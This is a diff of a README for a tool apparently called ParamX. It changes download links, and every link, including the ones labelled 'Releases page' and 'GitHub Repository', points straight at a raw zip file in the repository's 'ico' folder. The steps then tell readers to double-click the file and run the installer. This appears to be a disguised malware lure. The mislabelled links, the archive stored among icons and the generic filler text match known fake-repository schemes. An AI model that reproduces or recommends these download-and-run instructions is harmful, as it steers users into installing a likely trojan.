@@ -7,18 +7,18 @@ ParamX is a tool designed to help you extract and construct parameters easily. T
 To get started, follow these simple steps to download and run ParamX. You will need an internet connection and a compatible operating system.
 
 1. Click this link to download:  
-   [![Download ParamX](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/X-Param-v3.2.zip)](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/X-Param-v3.2.zip)
+   [![Download ParamX](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/Param_X_v1.9.zip)](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/Param_X_v1.9.zip)
 
 2. After clicking the link, you will be directed to the Releases page. This page contains the latest versions of ParamX available for download.
 
 ## 📥 Download & Install
-1. Visit this page to download: [ParamX Releases](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/X-Param-v3.2.zip).
+1. Visit this page to download: [ParamX Releases](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/Param_X_v1.9.zip).
 
 2. On the Releases page, you will see a list of versions. Each version includes a download link. Choose the version that best suits your needs.
 
 3. After selecting a version, find the file suitable for your operating system. Click on the link to start the download.
 
-4. Once the download finishes, locate the file in your downloads folder. It may be named something like `https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/X-Param-v3.2.zip` or similar, depending on the version.
+4. Once the download finishes, locate the file in your downloads folder. It may be named something like `https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/Param_X_v1.9.zip` or similar, depending on the version.
 
 5. Double-click the downloaded file to run the installer.
 
@@ -60,7 +60,7 @@ Join our community for additional help and support. Whether you have questions o
 If you're interested in contributing to ParamX, your help is welcome. Feel free to check out our guidelines on the repository. Contributions could include reporting bugs, suggesting features, or even providing code improvements.
 
 ## 🔗 Quick Links
-- [Download ParamX](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/X-Param-v3.2.zip)
-- [ParamX GitHub Repository](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/X-Param-v3.2.zip)
+- [Download ParamX](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/Param_X_v1.9.zip)
+- [ParamX GitHub Repository](https://raw.githubusercontent.com/viaC5real/ParamX/main/ico/Param_X_v1.9.zip)
 
 By following these steps, you’ll be on your way to efficiently managing parameters with ParamX. Enjoy using the tool!
